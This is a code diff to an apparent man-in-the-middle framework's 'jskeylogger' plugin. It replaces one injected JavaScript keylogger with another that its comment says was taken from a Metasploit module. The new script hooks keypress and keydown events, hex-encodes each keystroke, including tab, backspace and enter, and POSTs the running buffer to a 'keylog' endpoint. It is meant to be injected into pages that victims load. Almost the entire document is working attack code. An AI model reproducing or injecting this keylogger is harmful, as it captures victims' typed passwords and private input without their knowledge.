@@ -9,14 +9,15 @@ class jskeylogger(Inject, Plugin):
 
     def initialize(self,options):
         Inject.initialize(self, options)
-        self.html_payload = self.get_payload()
+        self.html_payload = self.msf_keylogger()
         print "[*] %s online" % self.name
 
-    def get_payload(self):
-        #simple js keylogger stolen from http://wiremask.eu/xss-keylogger/
+    def msf_keylogger(self):
+        #Stolen from the Metasploit module http_javascript_keylogger
 
         payload = """<script type="text/javascript">
-var keys = '';
+window.onload = function mainfunc(){
+var2 = ",";
 
 function make_xhr(){
     var xhr;
@@ -42,21 +43,42 @@ function make_xhr(){
             }
         }
 
-document.onkeypress = function(e) {
-    var get = window.event ? event : e;
-    var key = get.keyCode ? get.keyCode : get.charCode;
-    key = String.fromCharCode(key);
-    keys += key;
+if (window.addEventListener) {
+document.addEventListener('keypress', function2, true);
+document.addEventListener('keydown', function1, true);
+} else if (window.attachEvent) {
+document.attachEvent('onkeypress', function2);
+document.attachEvent('onkeydown', function1);
+} else {
+document.onkeypress = function2;
+document.onkeydown = function1;
 }
 
-window.setInterval(function(){
-    if (keys.length > 0){
-        xhr.open("POST", "keylog", true);
-        xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-        xhr.send(keys);
-        keys = '';
-    }
-}, 1000);
+}
+function function2(e){
+var3 = (window.event) ? window.event.keyCode : e.which;
+var3 = var3.toString(16);
+if (var3 != "d"){
+function3(var3);
+}
+}
+function function1(e){
+var3 = (window.event) ? window.event.keyCode : e.which;
+if (var3 == 9 || var3 == 8 || var3 == 13){
+function3(var3);
+}
+}
+
+function function3(var3){
+var2 = var2 + var3 + ",";
+
+xhr.open("POST", "keylog", true);
+xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xhr.send(var2);
+
+if (var3 == 13 || var2.length > 3000)
+    var2 = ",";
+}
 </script>"""
 
         return payload
